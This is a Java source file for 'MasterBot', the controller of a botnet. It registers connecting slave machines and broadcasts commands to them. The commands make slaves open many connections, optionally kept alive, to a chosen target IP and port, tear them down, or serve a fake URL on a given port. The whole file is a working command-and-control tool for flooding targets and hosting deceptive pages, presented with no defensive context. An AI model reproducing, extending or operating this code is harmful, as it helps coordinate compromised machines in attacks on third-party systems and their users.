import java.io.IOException;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Scanner;
import java.net.Socket;

class ClientConnections 
{
	String SlaveAddress;
	String SlaveName;
	int SlavePort;
	Socket SlaveSocket;
	String HostAddress;
	String HostName;
	int HostPort;
	Socket HostSocket;
	String date;
}


public class MasterBot {
	static int Port;
	public ServerSocket ServerSoc;
	public static ArrayList<ClientConnections> CliList = new ArrayList<ClientConnections>();
	static String InputCommand;
	static int No_of_conn;

	public static void main(String[] args) throws IOException {
		
		String command5 =  null;
		if (args.length < 2) {
			System.out.println("Entered command is Incorrect !");
			System.out.println("Usage: MasterBot -p [port_number]");

			System.exit(0);
		}
		else if (args.length == 2) {
			if (args[0] != null && args[0].equals("-p")) {
				Port = Integer.parseInt(args[1]);
			}
			else {
				System.out.println("Incorrect Command");
				System.out.println("Usage: MasterBot -p [port_number]");
				System.exit(0);
			}
		}
		ServerSocket server_socket = null;
		try {
			server_socket = new ServerSocket(Port);
		} catch (IOException e1) {
			e1.getMessage();
		}
		Thread t = new Thread(new SocketClientAccept(server_socket, Port), "My Thread");
		t.start();
		while (true) {
			System.out.print(">");
			Scanner SC = new Scanner(System.in);
			InputCommand = SC.nextLine();
			String[] CMD = InputCommand.split(" ");
			if (CMD[0].equals("list")) {
				System.out.println("Slave HostName" + "  " + " IPAddress" + "  " + "SourcePortNumber" + "  " +"RegistrationDate");
					System.out.println("--------------" + "  " + "-----------" + "  " + "---------------" + "  " +"----------------");
				for (int i = 0; i < CliList.size(); i++) {
					
					System.out.println("   " + CliList.get(i).SlaveName + "     " + CliList.get(i).SlaveAddress
							+ "            " + CliList.get(i).SlavePort + "         " + CliList.get(i).date);
				}
			}
			else if (CMD[0].equals("connect")) {
				if (CMD.length < 4) {
					System.out.println("Incorrect connect command");
				} else 
				{
					if(CMD.length==4)
					{
						No_of_conn = 1;
					}
					else if (CMD.length == 6) 
					{
						No_of_conn = Integer.parseInt(CMD[4]);
						command5=CMD[5];
					} 
					else if (CMD.length==5)
					{
						if (CMD[4].matches("^[0-9]+$")) 
						{
							No_of_conn = Integer.parseInt(CMD[4]);
						}
						else if (CMD[4].equalsIgnoreCase("keepalive")|| CMD[4].matches("^url=[^ ]+$") ||(CMD[4].matches("^url="))) {
							No_of_conn = 1;
							command5=CMD[4];
						} 
					}
					else
					{
						System.out.println("Incorrect connect command with more than 6 args");
					}
					Iterator<ClientConnections> i = CliList.iterator();
					if (CMD[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) 
					{
						int found = 0;
						while (i.hasNext()) 
						{
							ClientConnections clicon1 = i.next();
							
							if (clicon1.SlaveAddress.equals(CMD[1]))
							{
								found = 1;
								PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
								if(command5==null)
								{
									p.println("connect " + CMD[2] + " " + CMD[3] + " " + No_of_conn );
									p.flush();
								}
								else
								{
										p.println("connect " + CMD[2] + " " + CMD[3] + " " + No_of_conn + " " + command5);
										p.flush();
								}
							}
						}
						if (found == 0) {
							System.out.println("Slave address not found");
						}
					}

					else if (CMD[1].equals("all")) {
						while (i.hasNext()) {
							ClientConnections clicon1 = i.next();
							PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
							if(command5==null)
							{
								p.println("connect " + CMD[2] + " " + CMD[3] + " " + No_of_conn);
								p.flush();
							}
							else
							{						
								p.println("connect " + CMD[2] + " " + CMD[3] + " " + No_of_conn + " " + command5);
								p.flush();
							}
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							ClientConnections clicon1 = i.next();
							if (clicon1.SlaveName.equals(CMD[1])) {
								found = 1;
								PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
								if(command5==null)
								{
									p.println("connect " + CMD[2] + " " + CMD[3] + " " + No_of_conn);
									p.flush();
								}
								else
								{
									p.println("connect " + CMD[2] + " " + CMD[3] + " " + No_of_conn + " " + command5);
									p.flush();
								}
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
				}
			}
			else if (CMD[0].equals("disconnect")) {
				if (CMD.length < 3) {
					System.out.println("Incorrect disconnect command");
				}
				else {
					int target_port = 0;
					if (CMD.length > 3) {
						target_port = Integer.parseInt(CMD[3]);
					}
					Iterator<ClientConnections> i = CliList.iterator();
					if (CMD[1].matches(
							"^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) {
						int found = 0;
						while (i.hasNext()) {
							ClientConnections clicon1 = i.next();
							if (clicon1.SlaveAddress.equals(CMD[1])) {
								found = 1;
								PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
								p.println("disconnect " + CMD[2] + " " + target_port);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave address not found");
						}
					}
					else if (CMD[1].equals("all")) {
						while (i.hasNext()) {
							ClientConnections clicon1 = i.next();
							PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
							p.println("disconnect " + CMD[2] + " " + target_port);
							p.flush();
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							ClientConnections clicon1 = i.next();
							if (clicon1.SlaveName.equals(CMD[1])) {
								found = 1;
								PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
								p.println("disconnect " + CMD[2] + " " + target_port);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
				}
			}
			else if (CMD[0].equals("rise-fake-url")) {
					if (CMD.length < 3) {
					System.out.println("Incorrect rise-fake-url command");
					System.out.println("Usage: rise-fake-url port_number url");
				}
				else{
					int target_port = 0;
					//if (CMD.length > 2) {
						target_port = Integer.parseInt(CMD[1]);
					
					Iterator<ClientConnections> i = CliList.iterator();
					
						int found = 0;
						while (i.hasNext()) {
							ClientConnections clicon1 = i.next();
							
								found = 1;
								PrintStream p = new PrintStream(clicon1.SlaveSocket.getOutputStream());
								p.println("rise-fake-url " +  "" + target_port+" "+CMD[2]);
								p.flush();
							
						
						}
				

		}
	}

			else if (CMD[0].equals("down-fake-url")) {
				if (CMD.length < 3) {
					System.out.println("Incorrect down-fake-url command");
					System.out.println("Usage: down-fake-url port_number url");
				}

			}
			else 
				System.out.println("Error: Incorrect command");
			}
		}
	}



class SocketClientAccept implements Runnable {
	int Port;
	ServerSocket ServerSocket;

	SocketClientAccept(ServerSocket Serversoc, int p) {
		Port = p;
		ServerSocket = Serversoc;
	}

	public void run() {

		while (true) {
			Socket client_socket = null;
			ClientConnections ClientConn = new ClientConnections();
			try {
				client_socket = ServerSocket.accept();
				ClientConn.SlaveName = client_socket.getInetAddress().getHostName();
				ClientConn.SlaveAddress = client_socket.getInetAddress().getHostAddress();
				ClientConn.SlavePort = client_socket.getPort();
				ClientConn.SlaveSocket = client_socket;
				ClientConn.date = new SimpleDateFormat("dd-MM-yyyy").format(Calendar.getInstance().getTime());
				MasterBot.CliList.add(ClientConn);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}